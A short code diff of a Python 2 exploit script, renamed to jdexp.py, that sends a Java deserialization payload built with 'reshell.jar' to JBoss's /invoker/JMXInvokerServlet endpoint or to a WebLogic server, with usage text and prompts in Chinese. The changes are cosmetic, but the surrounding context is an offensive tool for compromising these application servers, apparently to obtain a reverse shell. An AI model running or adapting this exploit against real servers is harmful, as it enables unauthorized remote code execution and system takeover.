@@ -39,7 +39,7 @@ def flood (matrix, start):
 
 if len(sys.argv) == 1:
 	flood (m, (0, 0) )
-	print '''\nusage: test.py [-h] [-jboss] [-weblogic] host port payload
+	print '''\nusage: jdexp.py [-h] [-jboss] [-weblogic] host port payload
 
 先用reshell.jar生成payload。
 
@@ -79,7 +79,6 @@ def jboss():
 	URL = args.host + ":" + args.port + "/invoker/JMXInvokerServlet"
 	print 'sending payload...'
 	requests.post(URL, data=payloadObj)
-	
 
 def weblogic():
 	# http://IP:7001/console/login/LoginForm.jsp
@@ -107,7 +106,6 @@ def weblogic():
 
 	print 'sending payload...'
 	sock.send(payload)
-
 
 if args.jboss!=True and args.weblogic!=True:
 	print "至少输入一个目标类型吧？(-jboss, -weblogic)"
